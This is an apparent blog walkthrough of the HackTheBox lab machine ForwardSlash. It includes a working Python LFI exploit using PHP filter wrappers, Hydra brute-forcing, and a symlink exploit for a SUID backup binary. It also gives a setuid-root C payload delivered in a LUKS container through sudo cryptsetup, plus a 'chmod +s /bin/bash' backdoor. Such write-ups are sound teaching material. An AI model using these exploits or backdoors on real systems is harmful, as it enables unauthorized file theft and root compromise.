---
title: 'HTB ForwardSlash - Hard'
date: 2024-07-13 00:00:00 +0000
categories: [HTB Machines]
tags: [Hard, Linux, HTB]
---

**ForwardSlash** is a hard HTB machine that begins with an **LFI vulnerability** using **PHP wrappers**, disclosing a hardcoded password located in the configuration files. Subsequently, one must connect via SSH with the obtained credentials and move laterally by exploiting an **SUID binary** to **read files owned by another user**. The root-level access to the machine is achievable by creating a **malicious LUKS container** by **abusing sudoers permissions**.

As always, I like to mention that this machine is a **great opportunity to practice scripting**!

<img src="/assets/img/forwardslash/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.190.235

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.190.235 -p- -sS -Pn -n --min-rate 5000

[+] Open ports:                                                                                                                                                                              

22, 80

[+] NSE Scan in process. This might take a while...                                                                                                                                          

[+] Command being used:                                                                                                                                                                      

/usr/bin/nmap 10.129.190.235 -sVC -p22,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 10:23 WEST
Nmap scan report for 10.129.190.235
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds

[+] Script finished successfully
```

Appended the newly discovered domain to */etc/hosts*.

```bash
echo -e "10.129.190.235\tforwardslash.htb" | sudo tee -a /etc/hosts
10.129.190.235  forwardslash.htb
```

A defaced web page received us on port TCP/80 XDDD.

<img src="/assets/img/forwardslash/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Didn’t find anything of interest in the web root.

```bash
feroxbuster --url http://forwardslash.htb/ -x php -C 404

200      GET      http://forwardslash.htb/index.php
200      GET      http://forwardslash.htb/defaced.png
200      GET      http://forwardslash.htb/
```

Discovered a *backup* vHost subdomain.

```bash
ffuf -u "http://10.129.190.235/" -H "Host: FUZZ.forwardslash.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0

backup                  [Status: 302, Size: 33, Words: 6, Lines: 1, Duration: 61ms]
```

Updated */etc/hosts* to access it.

```bash
tail -n 1 /etc/hosts       
10.129.190.235  forwardslash.htb backup.forwardslash.htb
```

A login portal received us.

<img src="/assets/img/forwardslash/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Gathered some interest files this time.

```bash
feroxbuster --url http://backup.forwardslash.htb/ -x php -C 404

302      GET      http://backup.forwardslash.htb/ => login.php
200      GET      http://backup.forwardslash.htb/register.php
200      GET      http://backup.forwardslash.htb/config.php
200      GET      http://backup.forwardslash.htb/api.php
301      GET      http://backup.forwardslash.htb/dev => http://backup.forwardslash.htb/dev/
302      GET      http://backup.forwardslash.htb/index.php => login.php
302      GET      http://backup.forwardslash.htb/logout.php => login.php
200      GET      http://backup.forwardslash.htb/login.php
302      GET      http://backup.forwardslash.htb/welcome.php => login.php
200      GET      http://backup.forwardslash.htb/bootstrap.css
403      GET      http://backup.forwardslash.htb/dev/index.php
302      GET      http://backup.forwardslash.htb/environment.php => login.php
```

# Exploitation

Default credentials didn’t work. The login error is too verbose, so we could enumerate users if needed.

<img src="/assets/img/forwardslash/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Created an account and logged in.

<img src="/assets/img/forwardslash/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

Gained access to a bunch of features.

<img src="/assets/img/forwardslash/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Discovered a potential username, *Chiv,* from the *Quick Message* tab.

<img src="/assets/img/forwardslash/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

Access is denied to the */dev* endpoint.

<img src="/assets/img/forwardslash/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

We’ve reached the attack vector from the previous compromise.

<img src="/assets/img/forwardslash/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

There is a simple client-side validation disabling this feature.

<img src="/assets/img/forwardslash/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

Removed `disabled=""` from the client-side code.

<img src="/assets/img/forwardslash/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

Started a Python HTTP server, `python3 -m http.server`, and inserted an URL that pointing to us.

<img src="/assets/img/forwardslash/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">

Received a connection. This parameter is not properly sanitized. Good news.

<img src="/assets/img/forwardslash/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">

Successfully achieved Local File Inclusion (LFI) by using PHP wrappers. Payload below:

```
url=php://filter/convert.base64-encode/resource=index.php
```

<img src="/assets/img/forwardslash/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">

Created a PoC in Python to automate our steps and easily exfiltrate the files.

```python
import argparse
import base64
import os
import requests
import sys

def login(target, user, password, session, headers):
    url = f'http://{target}/login.php'
    data = f'username={user}&password={password}'
    response = session.post(url, headers=headers, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"\n[+] Logged in as {user}:{password}")

    else:
        raise Exception("\n[!] Login failed :(")

    return session

def register(target, headers):

    # register as dusk:dusk1234
    url = f'http://{target}/register.php'
    data = 'username=dusk&password=dusk1234&confirm_password=dusk1234'

    requests.post(url, headers=headers, data=data, allow_redirects=False)

def exploit(target, file, write, user="", password=""):

    s = requests.Session()
    headers = {
        'Host': 'backup.forwardslash.htb',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # log in
    if not user or not password:
        register(target, headers)
        user, password = 'dusk', 'dusk1234'

    s = login(target, user, password, s, headers)
    
    # LFI
    url = f'http://{target}/profilepicture.php'
    payload = f'php://filter/convert.base64-encode/resource={file}'
    data = f'url={payload}'
    
    response = s.post(url, headers=headers, data=data)

    # format output
    response_list = response.text.split('\n')
    offset = response_list.index('</html>') + 1
    payload = ''.join(response_list[offset:])
    file_dump = base64.b64decode(payload).decode('utf-8')

    print(f'\n[+] Dumping {file}:\n\n{file_dump}')

    # write to disk
    dump_filename = file.split('/')[-1] + '.dmp'

    if write and not os.path.exists(dump_filename):
        with open(dump_filename, 'w') as f:
            f.write(file_dump)
        
        print(f"[+] File saved as {dump_filename}")

    elif os.path.exists(dump_filename):
        raise Exception(f"[!] {dump_filename} already exists!")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB ForwardSlash LFI Exploit"
    )
    parser.add_argument('-t', '--target', required=True, dest='target')
    parser.add_argument('-f', '--file', required=True, dest='file')
    parser.add_argument('-u', '--user', dest='user')
    parser.add_argument('-p', '--password', dest='password')
    parser.add_argument('-w', '--write', dest='write', action='store_true', default=False)
   
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        exploit(args.target, args.file, args.write, args.user, args.password)

        print("\n[+] Script finished successfully")
        sys.exit(0)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

    except Exception as e:
        print(e)
        sys.exit(1)

main()
```

Executed it using the `-w` flag to save a copy of the file.

```bash
python3 forwardslash.py -t 10.129.190.235 -f /etc/passwd -w

[+] Logged in as dusk:dusk1234

[+] Dumping /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

[+] File saved as passwd.dmp

[+] Script finished successfully
```

Discovered a new user called *pain*, and confirmed our thoughts about the *chiv* user.

```bash
cat passwd.dmp | grep sh$

root:x:0:0:root:/root:/bin/bash
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
```

Gathered a hash from the *config.php* file (or a very long password XD).

```bash
python3 forwardslash.py -t 10.129.190.235 -f config.php    

[+] Logged in as dusk:dusk1234

[+] Dumping config.php:

<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '<REDACTED>');
...

[+] Script finished successfully
```

Gathered even more credentials from the */dev* endpoint that we couldn’t access earlier.

```bash
python3 forwardslash.py -t 10.129.190.235 -f dev/index.php                                                             

[+] Logged in as dusk:dusk1234

[+] Dumping dev/index.php:

<?php

if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

                if (@ftp_login($conn_id, "chiv", '<REDACTED>')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
  }
...

[+] Script finished successfully
```

Validated the credentials with *Hydra*.

```bash
hydra ssh://10.129.190.235 -L users.list -P pwd.list -I -t 4

[22][ssh] host: 10.129.190.235   login: chiv   password: <REDACTED>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-12 11:56:08
```

Established a fully interactive SSH session as *Chiv*. Noice!

```bash
ssh chiv@10.129.190.235

chiv@forwardslash:~$ whoami
chiv

chiv@forwardslash:~$ id
uid=1001(chiv) gid=1001(chiv) groups=1001(chiv)
```

# Lateral Movement

Our home directory doesn’t have a sh*t, but there is an interesting *note.txt* file in *Pain*’s home dir.

```
chiv@forwardslash:/home$ ls -lah
total 16K
drwxr-xr-x  4 root root 4.0K Mar  5  2020 .
drwxr-xr-x 24 root root 4.0K Mar 24  2020 ..
drwxr-xr-x  5 chiv chiv 4.0K Mar 24  2020 chiv
drwxr-xr-x  7 pain pain 4.0K Mar 17  2020 pain

chiv@forwardslash:/home$ cd pain

chiv@forwardslash:/home/pain$ ls -l
total 12
drwxr-xr-x 2 pain root 4096 Mar 24  2020 encryptorinator
-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt
-rw------- 1 pain pain   33 Jul 12 09:20 user.txt
```

A crypto challenge T-T. Spoiler: We skipped it hahahaha.

```
chiv@forwardslash:/home/pain$ cat note.txt
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv

chiv@forwardslash:/home/pain$ cd encryptorinator

chiv@forwardslash:/home/pain/encryptorinator$ ls -lah
total 16K
drwxr-xr-x 2 pain root 4.0K Mar 24  2020 .
drwxr-xr-x 7 pain pain 4.0K Mar 17  2020 ..
-rw-r--r-- 1 pain root  165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
```

<img src="/assets/img/forwardslash/Untitled 14.png" alt="Untitled 14.png" style="width:800px;">

More post-enumeration led us to discover a *backup* SUID that belongs to *Pain*. I like this better.

```
chiv@forwardslash:~$ find / -type f -perm /4000 -exec ls -lah {} \; 2>/dev/null | grep -vE 'snap'

-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-r-sr-xr-x 1 pain pain 14K Mar  6  2020 /usr/bin/backup
...
```

This might be the way to move laterally.

```
chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
 Pain's Next-Gen Time Based Backup Viewer
 v0.1
 NOTE: not reading the right file yet, 
 only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 11:13:11
ERROR: c3dd1ab9ff55270b633ed2eff308ff5b Does Not Exist or Is Not Accessible By Me, Exiting...
```

A new day with new flags awaiting for us (hopefully). Running the binary multiple times revealed that the hash is not randomly generated.

```
chiv@forwardslash:~$ /usr/bin/backup

Current Time: 10:36:13
ERROR: 6ffb670cbb1148ec142a46f36789dcca Does Not Exist or Is Not Accessible By Me, Exiting...

chiv@forwardslash:~$ /usr/bin/backup

Current Time: 10:36:14
ERROR: 6cccb9416e0ecd3195869dbdc1b57663 Does Not Exist or Is Not Accessible By Me, Exiting...

chiv@forwardslash:~$ /usr/bin/backup

Current Time: 10:36:14
ERROR: 6cccb9416e0ecd3195869dbdc1b57663 Does Not Exist or Is Not Accessible By Me, Exiting...
```

Hashing the printed *Current Time* returns the same exact value. We are getting closer!

```
chiv@forwardslash:~$ echo -n '10:36:14' | md5sum | awk '{print $1}'

6cccb9416e0ecd3195869dbdc1b57663
```

Created a Python PoC that executes the SUID binary twice. Explanation below:

- 1st Iteration: Runs the binary and grabs the time to get the hash (we could directly get the hash from the output but I wanted to practice regex and hashing XD).
- 2nd Iteration: Creates a symlink with `ln -s` to achieve arbitrary file reading (the SUID owner is *Pain* so if he can read it, we also can).

```python
import argparse
import hashlib
import re
import shlex
import subprocess
import sys

def md5_for_me(time):
    hash = hashlib.md5()
    hash.update(time.encode())

    return hash.hexdigest()

def exploit(file):

    # get time in hh:mm:ss format. Ex: 13:37:00
    command1 = '/usr/bin/backup'
    output1 = subprocess.check_output(shlex.split(command1)).decode()
    pattern = r'\d{2}:\d{2}:\d{2}'
    time = re.findall(pattern, output1)[0]

    print(f"\n[+] Script's time: {time}")

    # get hash
    hash = md5_for_me(time)
    print(f"\n[+] Generated hash: {hash}")

    # abuse via symlink
    command1 = f'/bin/ln -s {file} {hash}'
    subprocess.run(shlex.split(command1), stdout=subprocess.DEVNULL)
    
    command2 = f'/usr/bin/backup'
    file_dump = '\n'.join((subprocess.check_output(shlex.split(command2)).decode()).split('\n')[8:])

    if file_dump:
        print(f"\n[+] Dumping {file}...\n\n{file_dump}")

    else:
        raise Exception("\n[!] File dump failed :(")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB ForwardSlash Symlink Exploit"
    )
    parser.add_argument('-f', '--file', required=True, dest='file')
    
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        exploit(args.file)
        print("\n[+] Script finished successfully")
        sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

    except Exception as e:
        print(e)
        sys.exit(1)

main()
```

Yessir! We could read the user’s flag.

```
chiv@forwardslash:~$ python3 forwardslash2.py -f /home/pain/user.txt

[+] Script's time: 11:46:16

[+] Generated hash: 8a96830c2ae7e5ac502ab902cb3e8b72

[+] Dumping /home/pain/user.txt...

0bd0274f68621aad****************

[+] Script finished successfully
```

Discovered a *config.php.bak* file that is only readable by the *Pain* user.

```
chiv@forwardslash:~$ find / -user pain -type f -exec ls -lah {} \; 2>/dev/null

-rw------- 1 pain pain 526 Jun 21  2019 /var/backups/config.php.bak
-r-sr-xr-x 1 pain pain 14K Mar  6  2020 /usr/bin/backup
-rw-r--r-- 1 pain pain 807 Apr  4  2018 /home/pain/.profile
-rw------- 1 pain pain 33 Jul 13 10:14 /home/pain/user.txt
-rw-r--r-- 1 pain pain 3.7K Apr  4  2018 /home/pain/.bashrc
-rw-r--r-- 1 pain pain 220 Apr  4  2018 /home/pain/.bash_logout
-rw-r--r-- 1 pain root 931 Jun  3  2019 /home/pain/encryptorinator/encrypter.py
-rw-r--r-- 1 pain root 165 Jun  3  2019 /home/pain/encryptorinator/ciphertext
-rw-r--r-- 1 pain root 256 Jun  3  2019 /home/pain/note.txt
```

Obtained what appears to be his password from that file.

```
chiv@forwardslash:~$ python3 [forwardslash2.py](http://forwardslash2.py/) -f /var/backups/config.php.bak

[+] Script's time: 11:51:02

[+] Generated hash: 1c65469731d8887c2a44e88c9a65ce37

[+] Dumping /var/backups/config.php.bak...

<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', '<REDACTED>');
define('DB_NAME', 'site');*
...

[+] Script finished successfully
```

Moved laterally to the *Pain* user. Just one more step to go and get root!

```
chiv@forwardslash:~$ su - pain
Password: 

pain@forwardslash:~$ whoami
pain

pain@forwardslash:~$ id
uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)
```

# PrivEsc

Listed the sudoers permissions of the current user.

```
pain@forwardslash:~/encryptorinator$ sudo -l

Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Found a way to exploit `cryptsetup` as sudo from to [*xct’s* notes](https://notes.vulndev.io/wiki/redteam/privilege-escalation/linux/gtfo-binaries), ignoring the crypto challenge (a year ago I didn’t know what a port was, let me focus on the important things first).

<img src="/assets/img/forwardslash/Untitled 15.png" alt="Untitled 15.png" style="width:800px;">

Created a LUKS container on our VM and mounted it. 

```bash
dd if=/dev/zero of=/tmp/vol bs=1M count=50
sudo /sbin/cryptsetup -vy luksFormat /tmp/vol
sudo /sbin/cryptsetup luksOpen /tmp/vol vol
sudo mkfs.ext4 /dev/mapper/vol
sudo mount /dev/mapper/vol /mnt
cd /mnt
```

Note: I reduced the size because it was taking an eternity to copy to the box.

This C payload will run the given command as root (UID 0).

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char ** const argv) { 
        setuid(0);
        setgid(0);
        system(argv[1]);
}
```

Compiled it, gave the right perms, and confirmed that it works as intended.

```bash
sudo gcc evil.c -o evil.o -static

sudo chmod 4755 evil.o

whoami                                                                                                       
kali

./evil.o whoami
root
```

Executed the last two commands from *xct’s* notes and copied the container to the box.

```bash
sudo umount /mnt && sudo cryptsetup luksClose vol

scp /tmp/vol pain@10.129.190.235:/home/pain/vol
```

Abused the sudoers permissions to mount the payload from the container.

```
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
    
pain@forwardslash:~$ cd /

pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen ~/vol backup
Enter passphrase for /home/pain/vol: 

pain@forwardslash:/$ sudo /bin/mount /dev/mapper/backup ./mnt/
```

Successfully achieved RCE as root! So I created a backdoor and pwned the box. GGs!

```
pain@forwardslash:/mnt$ ./evil.o whoami
root

pain@forwardslash:/mnt$ ./evil.o "chmod +s /bin/bash"
pain@forwardslash:/mnt$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash

pain@forwardslash:/mnt$ bash -p
bash-4.4# whoami
root

bash-4.4# id
uid=1000(pain) gid=1000(pain) euid=0(root) egid=0(root) groups=0(root),1000(pain),1002(backupoperator)

bash-4.4# cat /root/root.txt
6619d16dd8bb2a99****************
```